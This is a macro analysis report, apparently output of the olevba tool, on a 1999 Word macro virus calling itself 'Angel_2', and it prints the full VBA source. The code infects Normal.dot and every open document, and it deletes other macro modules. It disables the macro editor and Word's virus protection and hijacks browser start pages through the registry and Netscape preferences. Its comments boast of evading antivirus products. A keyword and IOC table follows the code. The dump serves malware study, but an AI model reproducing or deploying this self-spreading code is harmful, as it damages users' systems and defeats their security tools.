olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Opey-based-d716fc83fd2e4f4276cc778f8656fcdf732bd370
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Opey-based-d716fc83fd2e4f4276cc778f8656fcdf732bd370 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Angel_2.bas 
in file: Virus.MSWord.Opey-based-d716fc83fd2e4f4276cc778f8656fcdf732bd370 - OLE stream: 'Macros/VBA/Angel_2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'// Netscape User Preferences
'// This is a generated file!  Do not edit.'
'
'user_pref("browser.startup.homepage", "http://www.escalix.com/freepage/angel");
'user_pref("browser.startup.homepage_override", false);
'user_pref("browser.wfe.ignore_def_check", true);
'user_pref("browser.window_rect", "0,0,632,480");
'user_pref("custtoolbar.personal_toolbar_folder", "Personal Toolbar Folder");
'user_pref("ldap_2.servers.infospace.csid", "UTF-8");
'user_pref("ldap_2.servers.infospace.filename", "infospace.na2");
'user_pref("ldap_2.servers.infospace.replication.lastChangeNumber", 0);
'user_pref("ldap_2.servers.netcenter.csid", "UTF-8");
'user_pref("ldap_2.servers.netcenter.filename", "netcenter.na2");
'user_pref("ldap_2.servers.netcenter.replication.lastChangeNumber", 0);
'user_pref("ldap_2.servers.pab.csid", "iso-8859-1");
'user_pref("ldap_2.servers.pab.filename", "pab.na2");
'user_pref("ldap_2.servers.pab.replication.lastChangeNumber", 0);
'user_pref("ldap_2.servers.verisign.csid", "UTF-8");
'user_pref("ldap_2.servers.verisign.filename", "verisign.na2");
'user_pref("ldap_2.servers.verisign.replication.lastChangeNumber", 0);
'user_pref("ldap_2.version", 2);
'user_pref("taskbar.x", 634);
'user_pref("taskbar.y", 5);

Sub AutoOpen()                  ' coded by D@rkByte
    Call stealth                ' Undetected by Norton Anti-virus 5.0, Dr. Sol. Antivirus
    On Error Resume Next        '   Tbav, and other shits
    Call clascopy               ' Copyaright 1999
    ActiveDocument.Save         ' Comments or Suggestions mailto: avenging.angel@mailcity.com
End Sub                         'Payload: change the Owner's Computer name
Sub AutoExec()                  '         on friday it will ask a question to be answered
    Call stealth                '         after 9/9/99 printing will print all the pages on a document
    On Error Resume Next        '         changes the home of the internet explorer to my site
    Call clascopy
    ActiveDocument.Save
End Sub
Sub FileSaveAs()
    On Error Resume Next
    Call clascopy
    Application.UserName = "Another infected of Angel Virus"
    Application.UserAddress = "Hacker From Batangas"
    Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub FilePageSetup()
    On Error Resume Next
    Call clascopy
    Dialogs(wdDialogFilePageSetup).Show
End Sub
Sub FilePrint()
    On Error Resume Next
    Call clascopy
    Dialogs(wdDialogFilePrint).Show
End Sub
Sub FileOpen()
    On Error Resume Next
    Dialogs(wdDialogFileOpen).Show
    Call clascopy
    ActiveDocument.Save
End Sub
Sub AutoClose()
    On Error Resume Next
    Call clascopy
End Sub
Sub AutoExit()
    On Error Resume Next
    Call clascopy
    Application.Quit
End Sub
Sub FileSave()
    On Error Resume Next
    Call clascopy
    ActiveDocument.Save
End Sub
Sub FileClose()
    On Error Resume Next
    Call clascopy
    If ActiveDocument.Words(1) <> "" _
    And ActiveDocument.Saved = False Then
    ActiveDocument.Save
    End If
    ActiveDocument.Close
End Sub
Sub FileExit()
    On Error Resume Next
    Call clascopy
    If ActiveDocument.Words(1) <> "" And _
    ActiveDocument.Saved = False Then
    ActiveDocument.Save
    End If
    Call payload
    Application.Quit
End Sub
Sub FileNew()
    On Error Resume Next
    Dialogs(wdDialogFileNew).Show
    Call clascopy
End Sub

Sub clascopy()
   On Error Resume Next
   Call stealth
    infected = False
        For A_A = NormalTemplate.VBProject.VBComponents.Count To 1 Step -1
            modname = NormalTemplate.VBProject.VBComponents(A_A).Name
                If modname = "Angel_2" Then infected = True
                If (modname <> "Angel_2") And (modname <> "ThisDocument") Then
                    Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:=modname, Object:=wdOrganizerObjectProjectItems
                End If
        Next A_A
        For Each documentopen In Documents
            Docinfected = False
            With documentopen
                For Angelclaw = documentopen.VBProject.VBComponents.Count To 1 Step -1
                modname = documentopen.VBProject.VBComponents(Angelclaw).Name
                    If modname = "Angel_2" Then Docinfected = True
                    If (modname <> "Angel_2") And (modname <> "ThisDocument") And (modname <> "Reference to Normal") Then
                        Application.OrganizerDelete Source:=documentopen.FullName, Name:=modname, Object:=wdOrganizerObjectProjectItems
                    End If
                Next Angelclaw
                If Docinfected = False Then
                     e = NormalTemplate.VBProject.VBComponents(2).CodeModule.CountOfLines
                    vircode = NormalTemplate.VBProject.VBComponents(2).CodeModule.Lines(1, e)
                    documentopen.VBProject.VBComponents.Add(1).Name = "Angel_2"
                    documentopen.VBProject.VBComponents(2).CodeModule.InsertLines 1, vircode
                End If
            End With
        Next documentopen
            If infected = False Then
                e = ActiveDocument.VBProject.VBComponents(2).CodeModule.CountOfLines
                    vircode = ActiveDocument.VBProject.VBComponents(2).CodeModule.Lines(1, e)
                    NormalTemplate.VBProject.VBComponents.Add(1).Name = "Angel_2"
                    NormalTemplate.VBProject.VBComponents(2).CodeModule.InsertLines 1, vircode
                    NormalTemplate.Save
                    Call payload2
            End If

End Sub
Sub stealth()
   On Error Resume Next
    CustomizationContext = NormalTemplate
    FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
    FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
    CommandBars("tools").Reset
    CommandBars("Visual Basic").Enabled = False
    CommandBars("Visual Basic").Enabled = False
    CommandBars("Visual Basic").Protection = msoBarNoChangeVisible
    CommandBars("Visual Basic").Protection = msoBarNoCustomize
    CommandBars("Tools").Controls("Macro").Enabled = False
    CommandBars("Tools").Controls("Customize...").Enabled = False
    CommandBars("Tools").Controls("Templates and Add-Ins...").Enabled = False
    Options.ConfirmConversions = False
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    ActiveDocument.ReadOnlyRecommended = False
    Application.UserName = "Another infected of Angel Virus"
    Application.UserAddress = "Hacker From Batangas"
    Dialogs(wdDialogFileSummaryInfo).Author = "Another infected of Angel Virus"
    Dialogs(wdDialogFileSummaryInfo).Title = "Angel_2"
    Dialogs(wdDialogFileSummaryInfo).Execute
    System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Internet Explorer\Main", _
    "Start Page") = "www.escalix.com/freepage/angel"
     System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\WINDOWS\CURRENTVERSION", _
    "RegisteredOwner") = "Avenging Angel :)"
    System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0", "DisplayName") = _
    "Infected with Angel Virus"
    Call payload2
End Sub

Sub payload()
aname = System.PrivateProfileString("", _
    "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "DefName")

If WeekDay(Date) = 4 Then MsgBox "Angel (ein-dzel)- a divine messenger of GOD" & Chr(13) & aname & " Sucks", 0, "from a Hacker from Batangas 'Too Many Secrets'"
End Sub
Sub payload2()
    auto$ = Dir("c:\Program Files\Netscape\users\default\*.js")
    startwrite = FreeFile
    If auto$ <> "" Then
        ChDir ("c:\Program Files\Netscape\users\default\")
        Open auto$ For Output Access Write As startwrite
        For x = 1 To 22
        ww = ActiveDocument.VBProject.VBComponents(2).CodeModule.Lines(x, 1)
        zz = Mid(ww, 2, Len(ww))
        Print #startwrite, zz
        Next x
        Close #startwrite
    End If
End Sub
















+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |documentopen        |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |http://www.escalix.c|URL                                          |
|          |om/freepage/angel   |                                             |
+----------+--------------------+---------------------------------------------+

